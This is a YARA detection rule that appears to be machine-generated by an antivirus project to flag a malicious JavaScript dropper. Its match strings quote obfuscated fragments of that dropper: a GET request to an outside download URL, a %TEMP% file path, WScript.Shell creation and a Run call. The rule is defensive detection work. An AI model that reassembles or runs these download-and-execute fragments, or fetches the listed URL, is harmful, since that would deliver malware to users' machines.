rule sig_20160427_d603ecdbf59e5828896929303a8f8968 {
  meta:
    description = "datamaliciousorder - file 20160427_d603ecdbf59e5828896929303a8f8968.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a8aa94ecb6a6d8d06acbf7b41e269cd98c2c3fa096c26ed83d606b1ded3e679a"

  strings:
    $s1  = "XbdnkTjbuz[QsvfmUhosk](\"G\" + \"ET\", \"http://soccerinsider.net/mys3ks\", false);" fullword ascii
    $s2  = "function TjtuqRcsal() {return ForuaSfghp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"8OMCYBb" ascii
    $s3  = "function TjtuqRcsal() {return ForuaSfghp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"8OMCYBb" ascii
    $s4  = "function HukkcGufte(LsvmwUocga, ZaapkWzksx){SywczCnvxm = SywczCnvxm * 1; return LsvmwUocga - ZaapkWzksx;};" fullword ascii
    $s5  = "var ForuaSfghp = function AacfuWbyle() {return RryxaSoccj[GktocFtbez](\"WScript\"+\".Shell\");}(), IhjboPitif = 11;" fullword ascii
    $s6  = "var RryxaSoccj = this[\"WScript\"];" fullword ascii
    $s7  = "function KqtwgDvcrg(){return XdurfWkcyn + \"\";};" fullword ascii
    $s8  = "if (XbdnkTjbuz[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function LaohzPsaqw() {return ((UltpbSysmc == true) && (UltpbSysmc == PnrgkWcbqw)) ? 1 : SywczCnvxm;};" fullword ascii
    $s10 = "}while (PecqcWknpc);" fullword ascii
    $s11 = "var NnedeFumyb = new this[\"D\"+\"ate\"]();" fullword ascii
    $s12 = "NusfvAjaoj = true;" fullword ascii
    $s13 = "function KhozlTpoqd(){return 23;};" fullword ascii
    $s14 = "UltpbSysmc = true; " fullword ascii
    $s15 = "var UltpbSysmc = false;" fullword ascii
    $s16 = "function LqczdHyfih(BpslzDmfpv){ForuaSfghp[\"R\"+\"un\"](BpslzDmfpv, SywczCnvxm, SywczCnvxm);};" fullword ascii
    $s17 = "return HukkcGufte(LijinIjial, UkmobDxcvv);" fullword ascii
    $s18 = "var NusfvAjaoj = false;" fullword ascii
    $s19 = "var PnrgkWcbqw = false;" fullword ascii
    $s20 = "function XlccfJxbaa()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}